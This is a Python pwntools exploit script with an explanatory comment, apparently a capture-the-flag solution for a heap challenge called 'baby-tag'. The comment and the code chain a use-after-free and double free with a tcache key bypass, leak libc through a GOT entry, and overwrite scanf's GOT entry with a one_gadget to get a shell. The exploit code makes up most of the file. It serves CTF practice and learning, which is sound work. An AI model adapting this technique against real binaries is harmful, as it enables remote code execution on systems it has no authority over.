#!/usr/bin/env python3

#This was my first ever heap challenge that i got my first blood..
#The binary has a Partial RELRO which means the got table is writable and 
#No PIE which makes the binary's base address always remains the  same.
#So there is no need of overwriting free hook here ..
#But system function is not present in binary .. 
#So we do need to  find the location of one gadget in libc to get rce.
#They have generously gave us the source code for the challenge..
#Where we can see the free function after freeing the chunk does not nulls it out..
#UAF and double free available!!
#But the problem is there is not a array that holds these chunk pointers..
#But only a single 64 bit pointer that holds the address of last allocated chunk..
#So we need a multiple frees on the last chunk and then edit the key field to bypass the double
#Free mitigation..Then for the leaks we can't do anything there is no view function something like that.
#But code shows that after edit it prints the chunks contents..So my exploit plan is to
#Use the double free to make a arbitary write on chunk pointer and then there is a tag which will stop us
#requesting chunks when the region is changed from heap to any other.
#So no more requesting chunks can be made but still we have the chunk pointer which we can used to edit
#And after each edit it prints the contents of the chunk pointer to the output..
#So my trick to get a libc leak was to tamper the chunk pointer with address of scanf .got
#So after the edit ..It prints out the libc address of scanf and then using the leak i edited again 
#But this time!! The value of scanf got is changed with one gadget..So when the option for the input
#is asked using scanf.. It executes the one gadget and pops the shell.




from pwn import *

e = ELF("./baby-tag")
#r = remote("35.228.15.118",1337)
r = process("./baby-tag")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def malloc(contents):
    r.sendafter(b">",b"1\n")
    r.sendafter(b"Contents>",contents)

def free():
    r.sendafter(b">",b"2\n")

def edit(contents):
    r.sendafter(b">",b"3\n")
    r.sendafter(b"Contents>",contents)


malloc(b"A" * 8)
i = 0
while(i < 4):
    free()
    edit(b"B" * 12)
    i+=1
free()
edit(p64(e.sym["chunk"]))
malloc(b"A" * 8)
r.sendafter(b">",b"1\n")
edit(p64(e.sym["chunk"]) + b'\x04\x04')
edit(p64(0x404058))
r.recvuntil(b"You just entered:")
leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
libc_base = leak - libc.sym["__isoc99_scanf"]
one_gadget = libc_base + 0xe3b31
edit(p64(one_gadget))
r.interactive()
